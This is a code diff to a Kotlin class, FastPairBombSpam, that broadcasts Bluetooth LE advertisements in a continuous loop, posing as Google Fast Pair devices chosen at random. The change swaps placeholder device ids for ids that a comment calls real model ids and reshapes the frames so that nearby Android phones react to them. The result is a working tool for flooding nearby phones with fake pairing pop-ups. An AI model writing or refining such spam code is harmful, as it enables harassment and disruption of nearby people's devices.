@@ -134,20 +134,29 @@ class FastPairBombSpam : Spammer {
     private var blink: Runnable? = null
 
     private val models = intArrayOf(
-        0x0000F0, 0x0000D0, 0x0000B0, 0x000070, 0x000050, 0x0000C0,
-        0x0100A0, 0x0100B0, 0x00F0A0, 0x00D0A0, 0x0090A0, 0x00C0A0,
+        // Real Fast Pair model ids. Three bytes each — the advertisement carries the
+        // model id and nothing else, so a longer frame is simply ignored by Play Services.
+        0xCB093B, 0x8A8F23, 0xDE215D, 0x5C7CDC, 0x9CB5F3, 0x0F2D16,
+        0x5C4833, 0x9A9BDD, 0xD820EA, 0xC9E352, 0x0002F0, 0x00F7D4,
+        0x13B39D, 0x1448C9, 0x1E89A7, 0x1E8B18, 0x77FF67, 0x87B25F,
     )
 
     override fun start() {
         if (!running.compareAndSet(false, true)) return
         executor.execute {
             val advertiser = BluetoothAdvertiser()
+            val uuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
             while (running.get()) {
                 val model = models[random.nextInt(models.size)]
-                val id = byteArrayOf((model shr 16).toByte(), (model shr 8).toByte(), model.toByte())
-                val serviceData = byteArrayOf(0x00) + id + random(3)
+                val serviceData = byteArrayOf(
+                    ((model shr 16) and 0xFF).toByte(),
+                    ((model shr 8) and 0xFF).toByte(),
+                    (model and 0xFF).toByte(),
+                )
                 val data = AdvertiseData.Builder()
-                    .addServiceData(android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), serviceData)
+                    .addServiceUuid(uuid)
+                    .addServiceData(uuid, serviceData)
+                    .setIncludeTxPowerLevel(true)
                     .build()
                 try {
                     advertiser.advertise(data, null)
